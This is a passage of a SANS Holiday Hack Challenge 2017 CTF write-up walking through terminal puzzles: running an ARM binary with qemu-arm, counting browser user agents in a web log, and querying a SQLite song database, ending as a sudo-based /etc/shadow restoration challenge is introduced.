               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-4-1-2" name="sec-5-4-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">

<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa">https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-home.png" alt="terminal-location-home.png" />
</p>
<p><span class="figure-number">Figure 7:</span> The terminal is on the side of the center building.</p>
</div>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-5-4-1-3" name="sec-5-4-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
We're logged in as the user elf. There's a file called <code>trainstartup</code> in our home directory.
</p>

<p>
This is a 64-bit x86 system:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ uname -a
Linux 784e43534178 4.9.0-4-amd64 <span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux</span>
</pre>
</div>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-5-4-1-4" name="sec-5-4-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
It looks like we just want to run the <code>trainstartup</code> file, but if we try that, we get an exec error:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ ./trainstartup 
bash: ./trainstartup: cannot execute binary file: Exec format error
</pre>
</div>
</div>
</li>

<li><a id="hints" name="hints"></a><a id="sec-5-4-1-5" name="sec-5-4-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">

<p>
<a href="https://twitter.com/PepperyGoodness">Pepper Minstix on Twitter has a hint</a>
</p>
<ul class="org-ul">
<li><a href="https://twitter.com/PepperyGoodness/status/938545233624678400">Actually, @GreenesterElf , you're better at prompt commands than I am. Why can't I get this model train thing working? I'm in the right directory like you taught me, but this system is still saying "No such file or directory"</a>
</li>
</ul>

<p>
<a href="https://twitter.com/GreenesterElf">Holly Evergreen on Twitter has a hint for this as well</a>
</p>
<ul class="org-ul">
<li><a href="https://twitter.com/GreenesterElf/status/938552050253643777">I still can't figure out Pepper Minstix's issue. It looks like the binary is compiled for another architecture. I think qemu can help, but I don't want to run the entire OS :\ <a href="https://doc.opensuse.org/documentation/">https://doc.opensuse.org/documentation/</a> helps, but I just want one binary, not the whole system!</a> <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book.virt/cha.qemu.running.html">https://doc.opensuse.org/documentation/leap/virtualization/html/book.virt/cha.qemu.running.html</a>
</li>
</ul>
</div>
</li>


<li><a id="approach" name="approach"></a><a id="sec-5-4-1-6" name="sec-5-4-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
There's really not much to go on here. We'll first use <code>file</code> to identify the <code>trainstartup</code> binary:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ file trainstartup 
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, <span style="font-weight: bold; font-style: italic;">BuildID</span>[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
</pre>
</div>

<p>
So the file is a Linux ELF binary, but it's for the ARM processor, and not for the x86_64 system that we're on. Let's see if there are any programs in our path that have <code>arm</code> in the file name:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ compgen -c | grep arm
qemu-arm
qemu-armeb
</pre>
</div>

<p>
Running it with the help option gives us:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ qemu-arm -h
usage: qemu-arm [options] program [arguments...]
Linux CPU emulator (compiled for arm emulation)
...
</pre>
</div>

<p>
This looks like exactly what we need. <code>qemu-arm</code> provides us with an ARM emulator, and we just need to run it with our program as the single argument. Let's give it a shot:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ qemu-arm ./trainstartup 
Starting up ... 

    Merry Christmas
    Merry Christmas
v
&gt;*&lt;
^
/o<span style="font-style: italic;">\</span>
/   <span style="font-style: italic;">\ </span>              @.&#183;
/~~   <span style="font-style: italic;">\ </span>               .
/ &#176; ~~  <span style="font-style: italic;">\ </span>        &#183;      
/      ~~ <span style="font-style: italic;">\ </span>      &#9670;       
/     &#176;   ~~<span style="font-style: italic;">\ </span>     .   0
/~~           <span style="font-style: italic;">\ </span>   &#9472;&#183; &#9472; &#183; o
    &#9484;&#9488;       /&#176; &#183;~~  .*&#183;   . <span style="font-style: italic;">\</span>
     &#9618;&#9618;&#9618;<span style="font-style: italic;">\ </span>    &#9474;  &#9472;&#9472;&#9516;&#9472;&#176;&#9472;&#9516;&#9472;&#176;&#9472;&#176;&#9472;&#176;&#9472;
&#8800;==&#8800;&#176;=&#8800;&#176;=&#8800;==&#9472;&#9472;&#9532;&#9472;&#9472;=&#8800;     &#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;
              &#9474;   /&#9492;&#9472;&#9472;&#9472;&#9496;<span style="font-style: italic;">\&#9484;</span>&#9472;&#9472;&#9472;&#9488;                                                 
                         &#9492;&#9472;&#9472;&#9472;&#9496;                                                 
&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;==&#8800;



You did it! Thank you!
</pre>
</div>

<p>
Success!
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-5-4-1-7" name="sec-5-4-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
You need to use <code>qemu-arm</code> to run the ARM binary: <code>qemu-arm ./trainstartup</code>
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-5-4-1-8" name="sec-5-4-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
The real difficulty of this terminal was in discovering that you
needed to use <code>qemu-arm</code>. <code>compgen -c</code> is a handy trick in CTFs to
figure out what special programs are installed on a certain
system. Another useful trick is using find to see what changes were
made to the system after it was installed. Let's take a quick look at
<code>qemu=arm</code> and at another file we know was changed, <code>trainstartup</code>:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ stat /usr/bin/qemu-arm trainstartup 
  File: <span style="font-style: italic;">'/usr/bin/qemu-arm'</span>
  Size: 1725888         Blocks: 3376       IO Block: 4096   regular file
Device: 801h/2049d      Inode: 1049395     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-09-20 14:01:57.000000000 +0000
Modify: 2017-09-20 14:01:57.000000000 +0000
Change: 2017-12-06 20:01:07.719592650 +0000
 Birth: -
  File: <span style="font-style: italic;">'trainstartup'</span>
  Size: 454636          Blocks: 888        IO Block: 4096   regular file
Device: 801h/2049d      Inode: 1049511     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2017-12-07 18:43:55.000000000 +0000
Modify: 2017-12-07 18:43:55.000000000 +0000
Change: 2017-12-07 18:43:58.191037092 +0000
 Birth: -
</pre>
</div>

<p>
If we look at the change time (or <code>ctime</code>), we can see that this
system was setup around December 6th, with the status of
<code>trainstartup</code> being changed the next day. An important thing to
remember with <code>ctime</code> is that the file contents didn't change, but
some data in the file inode did (permissions, creation,
etc.). Normally, we might use something like the modification time,
but that doesn't work well for files installed from packages.
</p>

<p>
A common way to setup a system is to first add sources to the package
manager, then install any necessary packages, and make any additional
modifications to a system. Let's use <code>find</code> to see what files were
modified after <code>/etc/apt</code> was changed, and we'll look for files with
<code>arm</code> in the name:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ find / -xdev -cnewer /etc/apt/sources.list | grep -w arm
/usr/bin/qemu-arm
/usr/share/man/man1/qemu-arm.1.gz
</pre>
</div>

<p>
In this case, I'm using <code>-xdev</code> to restrict the <code>find</code> to files on the
same device (thus excluding <code>/sys</code>, <code>/proc</code>, etc.).
</p>

<p>
If that still didn't work, here's a one-liner to sort the files on the
system according to when their <code>ctime</code> was modified. This would enable
you to see a complete timeline of changes to files:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ find / -xdev -printf <span style="font-style: italic;">"%C+\t%p\n"</span> | sort | head
2017-12-04+14:36:51.7363603170  /bin/bash
2017-12-04+14:36:51.7363603170  /bin/bunzip2
2017-12-04+14:36:51.7363603170  /bin/bzcat
2017-12-04+14:36:51.7363603170  /bin/bzcmp
2017-12-04+14:36:51.7363603170  /bin/bzdiff
2017-12-04+14:36:51.7363603170  /bin/bzegrep
...
</pre>
</div>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-4-1-9" name="sec-5-4-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
This terminal was tricky because almost no information was
given. Knowing how to use <code>file</code> to identify that <code>trainstartup</code> was
an ARM binary, and knowing how to find <code>qemu-arm</code> was key.
</p>

<p>
If you simply google "cannot execute binary file: Exec format error" it will
lead you down a rabbit hole.  Normally, this error is caused by downloading a
binary for the wrong architecture and the fix is to simply re-download the
right binary.  In this case, we can't download a version of the binary built
for the correct architecture.  What we need to do is "Run arm binary on amd64".
Searching for this points us to using qemu as an emulator.
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-5-5" class="outline-3">
<h3 id="sec-5-5">Bumble's Bounce</h3>
<div class="outline-text-3" id="text-5-5">
</div><div id="outline-container-title" class="outline-4">
<h4 id="title"><a id="sec-5-5-1" name="sec-5-5-1"></a>Bumbles Bounce</h4>
<div class="outline-text-4" id="text-title">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-5-1-1" name="sec-5-5-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<pre class="example">
                           ._    _.
                           (_)  (_)                  &lt;&gt; \  / &lt;&gt;
                            .\::/.                   \_\/  \/_/ 
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _&lt;&gt;_\_\&lt;&gt;/_/_&lt;&gt;_
      :o|   |   |o:         '/::\'                 &lt;&gt; / /&lt;&gt;\ \ &lt;&gt;
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           &gt;O&lt;             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       &lt;&gt; /  \ &lt;&gt;
      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
      ''   /o\   ''     '.|  |.'      \/ //&gt;&lt;\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
    :-&gt;@&lt;-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o 
  o    :    o           \* \ / */                   /o\
       o                 &gt;--X--&lt;
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-5-1-2" name="sec-5-5-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">

<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a">https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-bounce.png" alt="terminal-location-bounce.png" />
</p>
<p><span class="figure-number">Figure 8:</span> The terminal is located at the top of the right hand hill.</p>
</div>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-5-5-1-3" name="sec-5-5-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-5-5-1-4" name="sec-5-5-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
The goal is to analyze a 'log file' and determine what the least popular browser.
</p>
</div>
</li>

<li><a id="hints" name="hints"></a><a id="sec-5-5-1-5" name="sec-5-5-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">

<p>
<a href="https://twitter.com/SirMintsALot">Minty Candycane on Twitter has some hints</a>
</p>
<ul class="org-ul">
<li><a href="https://twitter.com/SirMintsALot/status/938187811869487104">The more I live my life as a Linux command-line user, the more I see problems waiting to be solved with cut, sort, uniq, head, and tail.</a>
</li>
<li><a href="https://twitter.com/SirMintsALot/status/938188406546251777">Oh wow, @Sw4mp_f0x and @bluscreenofjeff did a great job on this Parsing for Pentesters series!</a>
</li>
<li><a href="https://twitter.com/SirMintsALot/status/938574395240366080">The only thing that last article didn't really help me with was <b>counting</b> unique lines. This post looks super helpful for that! <a href="https://unix.stackexchange.com/questions/170043/sort-and-count-number-of-occurrence-of-lines/263849">https://unix.stackexchange.com/questions/170043/sort-and-count-number-of-occurrence-of-lines/263849</a>  (it's even against web server logs, just the wrong field)</a>
</li>
</ul>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-5-5-1-6" name="sec-5-5-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
A directory listing shows that terminal contains a binary called 'runtoanswer',
as well as fairly large 'access.log' file:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ ls -lh
total 29M
-rw-r--r-- 1 root root  24M Dec  4 17:11 access.log
-rwxr-xr-x 1 root root 5.0M Dec 11 17:31 runtoanswer
elf@784e43534178:~$ wc -l access.log 
98655 access.log

elf@784e43534178:~$ head -n1 access.log 
XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] <span style="font-style: italic;">"GET /robots.txt HTTP/1.1"</span> 301 185 <span style="font-style: italic;">"-"</span> <span style="font-style: italic;">"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"</span>
</pre>
</div>

<p>
Seems we have a web log in the "Common Log Format", which as it turns out, used
to be called the "NCSA Common log format" when it was output by NCSA HTTPd in 1993
before that became apache.  It always struck me as an arbitrary log format..
Fields are separated by spaces, except for the date/time which is wrapped in
brackets.  Also except for the request which has the "method uri protocol"
quoted, and the user agent quoted as well.  Some fields are also hex encoded.  Anyway,
since we just want the user-agents, we can split the log lines on the double quote char.
</p>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-5-5-1-7" name="sec-5-5-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
My solution is to use the cut tool, along with sort and uniq to find the least popular browser.
cut is very limited compared to tools like awk or sed, but it is often simpler
to use.  We just need to grab the right field.
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 4
-
elf@784e43534178:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 5

elf@784e43534178:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6
<span style="font-weight: bold;">Mozilla/5.0</span> (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)
</pre>
</div>

<p>
The 6th field is the user agent.  We also only want everything to the left of the first slash, so
different versions of the same browser are merged:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1
Mozilla
</pre>
</div>

<p>
Now that the browser is isolated, we can switch head with cat, and use the
standard `sort | uniq -c | sort -n` to grab a frequency
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1|sort|uniq -c|sort -n|tail -n 5
     33 slack
     34 Googlebot-Image
    143 -
    422 Slack-ImgProxy (+https:
  97896 Mozilla
</pre>
</div>

<p>
Oops.. I mixed up the ordering, need the first 5, not the last 5:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1|sort|uniq -c|sort -n|head -n 5
      1 Dillo
      2 (KHTML, like Gecko) Chrome
      2 Slackbot-LinkExpanding 1.0 (+https:
      2 Telesphoreo
      2 Twitter
</pre>
</div>

<p>
Looks like my favorite lightweight browser from 2001 is not very popular these days.
</p>

<p>
I can also confirm that the log file only has a single entry for this user-agent:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ grep Dillo access.log 
XX.YY.54.139 - - [27/Nov/2017:19:41:49 -0500] <span style="font-style: italic;">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> 301 185 <span style="font-style: italic;">"-"</span> <span style="font-style: italic;">"Dillo/3.0.5"</span>
</pre>
</div>

<p>
TODO: AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-5-5-1-8" name="sec-5-5-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
TODO: Any other, easier solutions?
</p>

<p>
We can RE the binary.
</p>
</div>
</li>

<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-5-1-9" name="sec-5-5-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">

<p>
The most common issue appeared to be the result of not normalizing the different browser versions.
If you count each VERSION of a browser as a separate program, you will get a result like:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|sort|uniq  -c|sort -n|head -n 5
      1 Dillo/3.0.5
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)
      1 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
      1 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
</pre>
</div>

<p>
or like:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@784e43534178:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d <span style="font-style: italic;">' '</span> -f 1|sort|uniq  -c|sort -n
      1 Dillo/3.0.5
      1 curl/7.35.0
</pre>
</div>
</div>
</li>

<li><a id="loot" name="loot"></a><a id="sec-5-5-1-10" name="sec-5-5-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">

<p>
Anything interesting hidden on the system?
TODO: not that i know of
</p>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-5-6" class="outline-3">
<h3 id="sec-5-6">I Don't Think We're In Kansas Anymore</h3>
<div class="outline-text-3" id="text-5-6">
</div><div id="outline-container-title" class="outline-4">
<h4 id="title"><a id="sec-5-6-1" name="sec-5-6-1"></a>I Don't Think We're In Kansas Anymore</h4>
<div class="outline-text-4" id="text-title">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-6-1-1" name="sec-5-6-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<pre class="example">
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..

Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-6-1-2" name="sec-5-6-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">

<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168">https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-kansas.png" alt="terminal-location-kansas.png" />
</p>
<p><span class="figure-number">Figure 9:</span> If you take away the poppies the terminal can easily be seen on the left hand side of the field.</p>
</div>
</div>
</li>

<li><a id="background-information" name="background-information"></a><a id="sec-5-6-1-3" name="sec-5-6-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">

<p>
When we login, we see we have two files of interest in our current
directory: <code>christmassongs.db</code> and <code>runtoanswer</code>.
</p>

<p>
If we try running <code>runtoanswer</code>, we see:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@197ceebbd305:~$ ./runtoanswer 
Starting up, please wait......
Enter the name of the song with the most likes:
</pre>
</div>

<p>
Blog Posts:
</p>

<p>
The SANS Pen-Test Blog had a post about essential SQL commands, which might be useful:
</p>

<blockquote>
<p>
Your Pokemon Guide for Essential SQL Pen Test Commands
  <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
</p>
</blockquote>
</div>
</li>

<li><a id="goal" name="goal"></a><a id="sec-5-6-1-4" name="sec-5-6-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">

<p>
Determine which song in <code>christmassongs.db</code> has the most likes.
</p>
</div>
</li>

<li><a id="hints" name="hints"></a><a id="sec-5-6-1-5" name="sec-5-6-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">

<p>
<a href="https://twitter.com/ThePlumSweetest">Sugarplum Mary on Twitter has a hint</a>
</p>
<ul class="org-ul">
<li><a href="https://twitter.com/ThePlumSweetest/status/941067133898833921">Hey @PepperyGoodness, can you help me with an SQL problem I've seen? I think I need to do GROUP BY, but I'm not quite sure of the syntax.</a>
</li>
</ul>
</div>
</li>

<li><a id="approach" name="approach"></a><a id="sec-5-6-1-6" name="sec-5-6-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">

<p>
Let's see exactly what this "db" file is:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@0d0185762210:~$ less christmassongs.db 
bash: less: command not found
elf@0d0185762210:~$ more christmassongs.db 
SQLite format 3
...
</pre>
</div>

<p>
sqlite!  Ok!  Let's start up sqlite and change some output options
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@5cf3b692a837:~$ sqlite3 christmassongs.db 
SQLite version 3.11.0 2016-02-15 17:29:24
Enter <span style="font-style: italic;">".help"</span> for usage hints.
sqlite&gt; .mode tabs  
sqlite&gt; .headers on
</pre>
</div>

<p>
Now, let's see what we are working with here.
</p>

<pre class="example">
sqlite&gt; .schema
CREATE TABLE songs(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
);
CREATE TABLE likes(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY(songid) REFERENCES songs(id)
);
</pre>

<p>
As a sanity check, let's see what one record of each looks like.
</p>

<pre class="example">
sqlite&gt; select * from songs limit 1;
id      title   artist  year    notes
1       A' Soalin'      Peter, Paul &amp; Mary      1963    From the album Moving. Written by Paul Stookey, Tracy Batteste &amp; Elaina Mezzetti. Contains an element of "God Res
t Ye Merry, Gentlemen".
sqlite&gt; select * from likes limit 1;
id      like    datetime        songid
1       1       1487102189      250
</pre>

<p>
Two tables, "songs", and "likes".  <code>likes.songid</code> matches up with <code>songs.id</code>.
This means we can join the two tables together on <code>songs.id=likes.songid</code>.  Once that
is done, the solution requires the count of likes grouped by title:
</p>

<pre class="example">
sqlite&gt; select title, count(*) from songs, likes where songs.id=likes.songid group by title order by count(*) desc limit 3;
title   count(*)
Stairway to Heaven      11325
Joy to the World        2162
The Little Boy that Santa Claus Forgot  2140
sqlite&gt;
</pre>
</div>
</li>

<li><a id="solution" name="solution"></a><a id="sec-5-6-1-7" name="sec-5-6-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">

<p>
A one-liner is:
</p>

<div class="org-src-container">

<pre class="src src-sh">elf@1dea81eaaac4:~$ sqlite3 christmassongs.db <span style="font-style: italic;">"select title from songs, likes where songs.id=likes.songid group by title order by count(*) desc limit 1;"</span>
Stairway to Heaven
</pre>
</div>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives" name="alternatives"></a><a id="sec-5-6-1-8" name="sec-5-6-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">

<p>
Instead of joining the tables, we can first find what the most popular songid is:
</p>

<pre class="example">
sqlite&gt; select songid, count(*) from likes group by songid order by count(*) desc limit 3;
songid  count(*)
392     11325
245     2162
265     2140
</pre>

<p>
and then look up what the title for that song is
</p>

<pre class="example">
sqlite&gt; select title from songs where id=392;
title
Stairway to Heaven
sqlite&gt;
</pre>


<p>
This can also be done in a single query as long as we don't care about the like count:
</p>

<pre class="example">
sqlite&gt; select title from songs where id in (select songid from likes group by songid order by count(*) desc limit 1);
Stairway to Heaven
</pre>
</div>
</li></ul>
</div>
</div>
<div id="outline-container-sec-5-7" class="outline-3">
<h3 id="sec-5-7">Oh Wait Maybe We Are</h3>
<div class="outline-text-3" id="text-5-7">
</div><div id="outline-container-title" class="outline-4">
<h4 id="title"><a id="sec-5-7-1" name="sec-5-7-1"></a>Oh Wait! Maybe WE Are&#x2026;</h4>
<div class="outline-text-4" id="text-title">
</div>

<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-7-1-1" name="sec-5-7-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">

<pre class="example">
            --&gt;*&lt;--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]  


My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.

Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
Hint: What commands can you run with sudo?
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-7-1-2" name="sec-5-7-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">

<p>
